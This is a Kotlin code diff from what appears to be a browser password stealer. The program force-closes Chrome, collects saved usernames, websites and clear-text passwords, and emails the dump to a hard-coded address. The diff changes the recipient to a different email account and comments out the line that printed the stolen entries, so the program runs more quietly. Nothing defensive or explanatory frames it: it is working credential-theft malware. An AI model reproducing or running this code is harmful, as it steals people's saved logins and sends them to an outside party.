@@ -7,7 +7,7 @@ import java.sql.DriverManager
 
 private lateinit var databaseFile: File
 private lateinit var connection: Connection
-private const val emailToSendTo = "budisyahiddin@pm.me"
+private const val emailToSendTo = "astroazure7@gmail.com"
 
 fun main(args: Array<String>) {
     Runtime.getRuntime().exec("taskkill /F /IM chrome.exe") // force close chrome
@@ -19,7 +19,7 @@ fun main(args: Array<String>) {
                 !it.username.isBlank()
                 !it.website.isBlank()
                 !it.clearTextPassword.isBlank()
-            }.also { it.forEach(::println) }
+            }//.also { it.forEach(::println) }
 
     val emailRes = MailerTLS.sendDump(emailToSendTo, list)
     if(emailRes) println("Sent ^^")
